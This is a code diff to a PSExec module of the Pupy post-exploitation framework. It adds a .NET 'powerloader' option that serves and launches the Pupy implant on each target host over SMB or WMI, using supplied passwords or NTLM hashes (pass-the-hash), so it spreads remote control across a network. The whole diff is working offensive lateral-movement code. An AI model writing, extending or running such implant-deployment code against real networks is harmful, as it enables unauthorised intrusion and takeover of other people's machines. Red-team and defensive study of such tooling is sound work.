@@ -7,9 +7,9 @@ from pupylib.PupyModule import (
     REQUIRE_STREAM
 )
 from netaddr import IPNetwork
+from modules.lib.windows import powerloader
 
 __class_name__ = "PSExec"
-
 
 @config(cat="admin")
 class PSExec(PupyModule):
@@ -46,7 +46,10 @@ class PSExec(PupyModule):
                                                                         "commands on the specified host")
         sgroup.add_argument('-execm', choices={"smbexec", "wmi"}, dest="execm", default="wmi",
                             help="Method to execute the command (default: wmi)")
-        sgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute a command")
+        sgroup.add_argument(
+            "-x", metavar="COMMAND", dest='command',
+            help='Execute a command. Use pupy64/pupy86 for .NET loader. '
+            'WARNING! There is no autodetection')
 
     def run(self, args):
 
@@ -58,7 +61,25 @@ class PSExec(PupyModule):
 
         smbexec = self.client.remote('pupyutils.psexec', 'smbexec')
 
+        completions = []
+
         for host in hosts:
+            if args.command in ('pupy86', 'pupy32', 'pupy64'):
+                _, completion = powerloader.serve(
+                    self, self.client.get_conf(),
+                    host=str(host),
+                    port=args.port,
+                    user=args.user,
+                    domain=args.domain,
+                    password=args.passwd,
+                    ntlm=args.hash,
+                    execm=args.execm,
+                    timeout=args.timeout,
+                    arch='x64' if args.command == 'pupy64' else 'x86'
+                )
+                completions.append(completion)
+                continue
+
             output, error = smbexec(
                 str(host), args.port,
                 args.user,  args.domain,
@@ -74,3 +95,9 @@ class PSExec(PupyModule):
 
             if error:
                 self.error(error)
+
+        if completions:
+            self.info('Wait for completions')
+            for completion in completions:
+                if not completion.is_set():
+                    completion.wait()
